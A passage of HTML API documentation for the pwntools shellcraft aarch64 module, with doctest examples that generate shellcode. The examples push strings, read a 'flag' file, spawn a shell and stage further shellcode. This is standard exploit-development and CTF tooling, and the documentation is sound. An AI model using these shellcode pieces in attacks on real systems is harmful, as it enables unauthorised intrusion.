<span class="go">    mov  x14, #256</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push SYS_execve (0xdd) */</span>
<span class="go">    mov  x14, #221</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_sendfile&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push SYS_sendfile (0x47) */</span>
<span class="go">    mov  x14, #71</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;freebsd&#39;</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="s1">&#39;SYS_execve&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="gp">...</span>
<span class="go">    /* push SYS_execve (0x3b) */</span>
<span class="go">    mov  x14, #59</span>
<span class="go">    str x14, [sp, #-16]!</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.pushstr">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">pushstr</code><span class="sig-paren">(</span><em>string</em>, <em>append_null=True</em>, <em>register1='x14'</em>, <em>register2='x15'</em>, <em>pretty=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/pushstr.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.pushstr" title="Permalink to this definition">¶</a></dt>
<dd><p>Pushes a string onto the stack.</p>
<p>r12 is defined as the inter-procedural scratch register ($ip),
so this should not interfere with most usage.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>string</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The string to push.</li>
<li><strong>append_null</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to append a single NULL-byte before pushing.</li>
<li><strong>register</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Temporary register to use.  By default, R7 is used.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;Hello!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;Hello!\x00&#39; */</span>
<span class="go">    /* Set x14 = 36762444129608 = 0x216f6c6c6548 */</span>
<span class="go">    mov  x14, #25928</span>
<span class="go">    movk x14, #27756, lsl #16</span>
<span class="go">    movk x14, #8559, lsl #0x20</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;Hello, world!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;Hello, world!\x00&#39; */</span>
<span class="go">    /* Set x14 = 8583909746840200520 = 0x77202c6f6c6c6548 */</span>
<span class="go">    mov  x14, #25928</span>
<span class="go">    movk x14, #27756, lsl #16</span>
<span class="go">    movk x14, #11375, lsl #0x20</span>
<span class="go">    movk x14, #30496, lsl #0x30</span>
<span class="go">    /* Set x15 = 143418749551 = 0x21646c726f */</span>
<span class="go">    mov  x15, #29295</span>
<span class="go">    movk x15, #25708, lsl #16</span>
<span class="go">    movk x15, #33, lsl #0x20</span>
<span class="go">    stp x14, x15, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;Hello, world, bienvenue&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;Hello, world, bienvenue\x00&#39; */</span>
<span class="go">    /* Set x14 = 8583909746840200520 = 0x77202c6f6c6c6548 */</span>
<span class="go">    mov  x14, #25928</span>
<span class="go">    movk x14, #27756, lsl #16</span>
<span class="go">    movk x14, #11375, lsl #0x20</span>
<span class="go">    movk x14, #30496, lsl #0x30</span>
<span class="go">    /* Set x15 = 7593667296735556207 = 0x6962202c646c726f */</span>
<span class="go">    mov  x15, #29295</span>
<span class="go">    movk x15, #25708, lsl #16</span>
<span class="go">    movk x15, #8236, lsl #0x20</span>
<span class="go">    movk x15, #26978, lsl #0x30</span>
<span class="go">    stp x14, x15, [sp, #-16]!</span>
<span class="go">    /* Set x14 = 28558089656888933 = 0x65756e65766e65 */</span>
<span class="go">    mov  x14, #28261</span>
<span class="go">    movk x14, #25974, lsl #16</span>
<span class="go">    movk x14, #30062, lsl #0x20</span>
<span class="go">    movk x14, #101, lsl #0x30</span>
<span class="go">    str x14, [sp, #-16]!</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&quot;Hello, world, bienvenue!&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    /* push &#39;Hello, world, bienvenue!\x00&#39; */</span>
<span class="go">    /* Set x14 = 8583909746840200520 = 0x77202c6f6c6c6548 */</span>
<span class="go">    mov  x14, #25928</span>
<span class="go">    movk x14, #27756, lsl #16</span>
<span class="go">    movk x14, #11375, lsl #0x20</span>
<span class="go">    movk x14, #30496, lsl #0x30</span>
<span class="go">    /* Set x15 = 7593667296735556207 = 0x6962202c646c726f */</span>
<span class="go">    mov  x15, #29295</span>
<span class="go">    movk x15, #25708, lsl #16</span>
<span class="go">    movk x15, #8236, lsl #0x20</span>
<span class="go">    movk x15, #26978, lsl #0x30</span>
<span class="go">    stp x14, x15, [sp, #-16]!</span>
<span class="go">    /* Set x14 = 2406458692908510821 = 0x2165756e65766e65 */</span>
<span class="go">    mov  x14, #28261</span>
<span class="go">    movk x14, #25974, lsl #16</span>
<span class="go">    movk x14, #30062, lsl #0x20</span>
<span class="go">    movk x14, #8549, lsl #0x30</span>
<span class="go">    mov  x15, xzr</span>
<span class="go">    stp x14, x15, [sp, #-16]!</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.setregs">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">setregs</code><span class="sig-paren">(</span><em>reg_context</em>, <em>stack_allowed=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/setregs.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.setregs" title="Permalink to this definition">¶</a></dt>
<dd><p>Sets multiple registers, taking any register dependencies into account
(i.e., given eax=1,ebx=eax, set ebx first).</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>reg_context</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Desired register context</li>
<li><strong>stack_allowed</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Can the stack be used?</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;x0&#39;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="p">:</span><span class="s1">&#39;x3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  x0, #1</span>
<span class="go">    mov  x2, x3</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">setregs</span><span class="p">({</span><span class="s1">&#39;x0&#39;</span><span class="p">:</span><span class="s1">&#39;x1&#39;</span><span class="p">,</span> <span class="s1">&#39;x1&#39;</span><span class="p">:</span><span class="s1">&#39;x0&#39;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="p">:</span><span class="s1">&#39;x3&#39;</span><span class="p">})</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
<span class="go">    mov  x2, x3</span>
<span class="go">    eor  x0, x0, x1 /* xchg x0, x1 */</span>
<span class="go">    eor  x1, x0, x1</span>
<span class="go">    eor  x0, x0, x1</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.trap">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">trap</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/trap.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.trap" title="Permalink to this definition">¶</a></dt>
<dd><p>Inserts a debugger breakpoint (raises SIGTRAP).</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">breakpoint</span><span class="p">())</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
<span class="go">-5</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.xor">
<code class="descclassname">pwnlib.shellcraft.aarch64.</code><code class="descname">xor</code><span class="sig-paren">(</span><em>key</em>, <em>address</em>, <em>count</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/xor.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.xor" title="Permalink to this definition">¶</a></dt>
<dd><p>XORs data a constant value.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>key</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a><em>,</em><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; XOR key either as a 4-byte integer,
If a string, length must be a power of two,
and not longer than 4 bytes.</li>
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the data (e.g. 0xdead0000, &#8216;rsp&#8217;)</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to XOR.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span>  <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">xor</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">expected</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">result</span> <span class="o">==</span> <span class="n">expected</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

</div>
<div class="section" id="module-pwnlib.shellcraft.aarch64.linux">
<span id="pwnlib-shellcraft-aarch64-linux"></span><h6><a class="reference internal" href="#module-pwnlib.shellcraft.aarch64.linux" title="pwnlib.shellcraft.aarch64.linux"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.shellcraft.aarch64.linux</span></code></a><a class="headerlink" href="#module-pwnlib.shellcraft.aarch64.linux" title="Permalink to this headline">¶</a></h6>
<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.cat">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">cat</code><span class="sig-paren">(</span><em>filename</em>, <em>fd=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/cat.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.cat" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file and writes its contents to the specified file descriptor.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="s1">&#39;This is the flag</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="n">disasm</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="go">   0:   d28d8cce        mov     x14, #0x6c66                    // #27750</span>
<span class="go">   4:   f2acec2e        movk    x14, #0x6761, lsl #16</span>
<span class="go">   8:   f81f0fee        str     x14, [sp, #-16]!</span>
<span class="go">   c:   d29ff380        mov     x0, #0xff9c                     // #65436</span>
<span class="go">  10:   f2bfffe0        movk    x0, #0xffff, lsl #16</span>
<span class="go">  14:   f2dfffe0        movk    x0, #0xffff, lsl #32</span>
<span class="go">  18:   f2ffffe0        movk    x0, #0xffff, lsl #48</span>
<span class="go">  1c:   910003e1        mov     x1, sp</span>
<span class="go">  20:   aa1f03e2        mov     x2, xzr</span>
<span class="go">  24:   aa1f03e3        mov     x3, xzr</span>
<span class="go">  28:   d2800708        mov     x8, #0x38                       // #56</span>
<span class="go">  2c:   d4000001        svc     #0x0</span>
<span class="go">  30:   aa0003e1        mov     x1, x0</span>
<span class="go">  34:   d2800020        mov     x0, #0x1                        // #1</span>
<span class="go">  38:   aa1f03e2        mov     x2, xzr</span>
<span class="go">  3c:   d29fffe3        mov     x3, #0xffff                     // #65535</span>
<span class="go">  40:   f2afffe3        movk    x3, #0x7fff, lsl #16</span>
<span class="go">  44:   d28008e8        mov     x8, #0x47                       // #71</span>
<span class="go">  48:   d4000001        svc     #0x0</span>
<span class="go">  4c:   aa1f03e0        mov     x0, xzr</span>
<span class="go">  50:   d2800ba8        mov     x8, #0x5d                       // #93</span>
<span class="go">  54:   d4000001        svc     #0x0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;This is the flag\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.connect">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">connect</code><span class="sig-paren">(</span><em>host</em>, <em>port</em>, <em>network='ipv4'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/connect.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.connect" title="Permalink to this definition">¶</a></dt>
<dd><p>Connects to the host on the specified port.
Network is either &#8216;ipv4&#8217; or &#8216;ipv6&#8217;.
Leaves the connected socket in x12.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.echo">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">echo</code><span class="sig-paren">(</span><em>string</em>, <em>sock='1'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/echo.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.echo" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a string to a file descriptor</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s1">&#39;hello</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.forkexit">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">forkexit</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/forkexit.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.forkexit" title="Permalink to this definition">¶</a></dt>
<dd><p>Attempts to fork.  If the fork is successful, the parent exits.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.loader">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">loader</code><span class="sig-paren">(</span><em>address</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/loader.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.loader" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the ELF as a register or integer.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.loader_append">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">loader_append</code><span class="sig-paren">(</span><em>data=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/loader_append.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.loader_append" title="Permalink to this definition">¶</a></dt>
<dd><p>Loads a statically-linked ELF into memory and transfers control.</p>
<p>Similar to loader.asm but loads an appended ELF.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; If a valid filename, the data is loaded from the named file.
Otherwise, this is treated as raw ELF data to append.
If <code class="docutils literal"><span class="pre">None</span></code>, it is ignored.</td>
</tr>
</tbody>
</table>
<p>Example:</p>
<p>The following doctest is commented out because it doesn&#8217;t work on Travis
for reasons I cannot diagnose.  However, it should work just fine :-)</p>
<blockquote>
<div># &gt;&gt;&gt; gcc = process([&#8216;aarch64-linux-gnu-gcc&#8217;,&#8217;-xc&#8217;,&#8217;-static&#8217;,&#8217;-Wl,-Ttext-segment=0x20000000&#8217;,&#8217;-&#8216;])
# &gt;&gt;&gt; gcc.write(&#8216;&#8217;&#8217;
# ... int main() {
# ...     printf(&#8220;Hello, %s!\n&#8221;, &#8220;world&#8221;);
# ... }
# ... &#8216;&#8217;&#8216;)
# &gt;&gt;&gt; gcc.shutdown(&#8216;send&#8217;)
# &gt;&gt;&gt; gcc.poll(True)
# 0
# &gt;&gt;&gt; sc = shellcraft.loader_append(&#8216;a.out&#8217;)
# &gt;&gt;&gt; run_assembly(sc).recvline()
# &#8216;Hello, world!n&#8217;</div></blockquote>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.open">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">open</code><span class="sig-paren">(</span><em>filename</em>, <em>mode='O_RDONLY'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/open.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.open" title="Permalink to this definition">¶</a></dt>
<dd><p>Opens a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.readn">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">readn</code><span class="sig-paren">(</span><em>fd</em>, <em>buf</em>, <em>nbytes</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/readn.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.readn" title="Permalink to this definition">¶</a></dt>
<dd><p>Reads exactly nbytes bytes from file descriptor fd into the buffer buf.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; fd</li>
<li><strong>buf</strong> (<em>void</em>) &#8211; buf</li>
<li><strong>nbytes</strong> (<em>size_t</em>) &#8211; nbytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.sh">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">sh</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/sh.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.sh" title="Permalink to this definition">¶</a></dt>
<dd><p>Execute a different process.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">aarch64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo Hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.socket">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">socket</code><span class="sig-paren">(</span><em>network='ipv4'</em>, <em>proto='tcp'</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/socket.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.socket" title="Permalink to this definition">¶</a></dt>
<dd><p>Creates a new socket</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.stage">
<code class="descclassname">pwnlib.shellcraft.aarch64.linux.</code><code class="descname">stage</code><span class="sig-paren">(</span><em>fd=0</em>, <em>length=None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/shellcraft/templates/aarch64/linux/stage.asm"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.shellcraft.aarch64.linux.stage" title="Permalink to this definition">¶</a></dt>
<dd><p>Migrates shellcode to a new buffer.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>fd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Integer file descriptor to recv data from.
Default is stdin (0).</li>
<li><strong>length</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Optional buffer length.  If None, the first pointer-width
of data received is the length.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_assembly</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">stage</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&quot;Hello</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello\n&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.shellcraft.aarch64.linux.syscall">
